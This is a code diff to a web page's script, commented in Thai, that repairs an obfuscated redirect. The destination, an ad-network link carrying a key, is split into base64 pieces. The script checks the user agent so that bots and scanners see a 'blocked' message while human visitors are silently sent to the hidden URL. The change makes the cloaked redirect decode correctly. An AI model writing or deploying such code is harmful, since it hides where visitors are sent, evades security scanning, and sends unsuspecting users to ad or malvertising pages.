@@ -15,10 +15,9 @@
   </style>
   <script>
     // URL จริงที่เข้ารหัสหลายชั้น
-    const part1 = "aHR0cHM6Ly93d3cucHJvZml0YWJsZXJhdGVjcG0uY29tLw==";
-    const part2 = "eHliZ3N1Zms2";
-    const part3 = "P2tleT1kMDY2ZDRjNjU4NDBmZTk4NzU0N2RjZWQwNmE3ZGQ5OQ==";
-    const encodedUrl = part1 + part2 + part3;
+    const part1 = "aHR0cHM6Ly93d3cucHJvZml0YWJsZXJhdGVjcG0uY29tLw=="; 
+    const part2 = "eHliZ3N1Zms2"; 
+    const part3 = "P2tleT1kMDY2ZDRjNjU4NDBmZTk4NzU0N2RjZWQwNmE3ZGQ5OQ=="; 
 
     // ตรวจบอทจาก user-agent
     const ua = navigator.userAgent.toLowerCase();
@@ -32,7 +31,7 @@
     // เริ่มการเปลี่ยนเส้นทาง
     function go() {
       if (shouldRedirect()) {
-        const finalUrl = atob(encodedUrl);
+        const finalUrl = atob(part1) + atob(part2) + atob(part3);
         window.location.href = finalUrl;
       } else {
         document.body.innerHTML = "<h1>ไม่สามารถเปลี่ยนเส้นทางได้</h1><p>ระบบป้องกันบล็อกไว้</p>";
